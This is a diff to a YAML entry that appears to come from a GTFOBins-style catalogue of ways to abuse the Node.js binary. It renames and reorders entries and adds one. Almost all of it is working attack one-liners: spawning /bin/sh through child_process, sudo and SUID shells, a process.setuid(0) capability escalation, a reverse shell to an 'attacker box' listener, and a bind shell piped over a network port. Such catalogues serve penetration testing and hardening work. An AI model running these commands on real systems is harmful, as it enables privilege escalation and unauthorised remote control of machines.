@@ -1,14 +1,8 @@
 ---
 functions:
-  exec-interactive:
+  shell:
     - code: |
         node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
-  sudo-enabled:
-    - code: |
-        sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
-  suid-enabled:
-    - code: |
-        ./node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});'
   reverse-shell:
     - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
@@ -30,4 +24,13 @@ functions:
           sh.stdout.pipe(client);
           sh.stderr.pipe(client);
         }).listen(process.env.LPORT);'
+  suid:
+    - code: |
+        ./node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});'
+  sudo:
+    - code: |
+        sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
+  capabilities:
+    - code: |
+        ./node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
 ---
